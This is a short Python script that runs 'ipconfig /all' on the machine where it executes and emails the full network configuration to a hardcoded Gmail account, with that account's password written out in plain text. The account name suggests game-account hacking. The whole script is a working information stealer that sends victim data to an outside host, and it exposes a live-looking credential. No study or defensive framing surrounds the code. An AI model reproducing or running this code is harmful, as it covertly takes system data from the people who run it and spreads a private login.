import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "ipconfig /all"
result = subprocess.check_output(command, shell=True)
send_mail("steamhackcsgokillit@gmail.com", "adrian450", result)